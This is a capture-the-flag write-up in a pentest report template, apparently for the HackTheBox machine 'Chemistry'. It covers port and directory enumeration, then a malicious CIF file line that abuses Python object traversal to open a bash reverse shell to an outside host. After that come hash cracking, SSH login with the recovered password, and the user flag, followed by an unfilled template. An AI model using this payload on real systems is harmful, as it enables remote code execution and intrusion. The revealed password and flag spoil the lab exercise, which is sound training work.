- **Independent Challenges**
- **1 Target #1 –** 10.10.11.38
- **1.1 Initial Access –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

- **1.1 Service Enumeration**

└─$ nmap -p- --min-rate 20000 10.10.11.38

![[Chemistry image.png]]

**I found two open ports.**

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
| 10.10.11.38 | **TCP**: 22,5000 |

Adding the domain name to the /etc/hosts file

└─$ echo "10.10.11.38 chemistry.htb" | sudo tee -a /etc/hosts

![[Chemistry image 1.png]]

**Investigating each port.**

Port 22 SSH

└─$ nmap -p22 -sV -sC 10.10.11.38 --min-rate 10000

![[Chemistry image 2.png]]

Port 5000 upnp

└─$ nmap -p5000 -sV -sC 10.10.11.38 --min-rate 10000

![[Chemistry image 3.png]]

![[Chemistry image 4.png]]

**Directory Enumeration.**

└─$ gobuster dir --url http://chemistry.htb:5000 -w /usr/share/wordlists/dirb/common.txt

![[Chemistry image 5.png]]

Subdomain Enumeration.

└─$ gobuster dns -d chemistry.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt r chemistry.htb:53

Vhost Enumeration.

└─$ ffuf -c -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u "http://chemistry.htb" -H "Host:FUZZ.chemistry.htb" -fc 404

Web Access

![[Chemistry image 6.png]]

**Login Page**

![[Chemistry image 7.png]]

**Register Page.**

![[Chemistry image 8.png]]

**Dashboard Page.**

**このページの****"here"****のリンクをクリックして****example.cif****をダウンロードし以下のように編集します。**

![[Chemistry image 9.png]]

I will refer to this site.

Before Editing

![[Chemistry image 10.png]]

Added the following line:

_space_group_magn.transform_BNS_Pp_abc  'a,b,\[d for d in ().__class__.__mro__\[1\].__getattribute__ ( *\[().__class__.__mro__\[1\]\]+\["__sub" + "classes__"\]) () if d.__name__ == "BuiltinImporter"\]\[0\].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.16.38/4444 0>&1\'");0,0,0'

_space_group_magn.number_BNS  62.448

_space_group_magn.name_BNS  "P  n'  m  a'  "

After Editing.

![[Chemistry image 11.png]]

After uploading this .cif file, click the view button to establish the reverse shell connection.

![[Chemistry image 12.png]]

![[Chemistry image 13.png]]

sqlite> select * from user;

![[Chemistry image 14.png]]

**この****hash****値を****CrackStation****でクラックします。**

![[Chemistry image 15.png]]

unicorniosrosados

このパスワードを利用して、sshでアクセスします。

└─$ ssh rosa@chemistry.htb

![[Chemistry image 16.png]]

![[Chemistry image 17.png]]

b3b31d642a603b85ed883111505cf1d6

**1.2** **Initial Access –**

**Local.txt value:**b3b31d642a603b85ed883111505cf1d6

**1.3** **Privilege Escalation -**

**1.4** **Post Exploitation**

**Proof.txt value:**

- **Active Directory Set**

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
|  | **TCP:** |
|  | **TCP:** |
|  | **TCP:** |

- **1  –**
- **1.1 Initial Access –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:** **Critical**

**Steps to reproduce the attack:**

- **1.2 Privilege Escalation –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:** **Critical**

**Steps to reproduce the attack:**

- **1.3 Post-Exploitation**

**System Proof screenshot:**

- **2  –**
- **2.1 Initial Access –**

**Steps to reproduce the attack:**

- **2.2 Post-Exploitation**

**Local Proof Screenshot:**

- **3 DC –**
- **5.3.1 Initial Access –**

**Steps to reproduce the attack:**

- **3.2 Post-Exploitation**

**System Proof Screenshot:**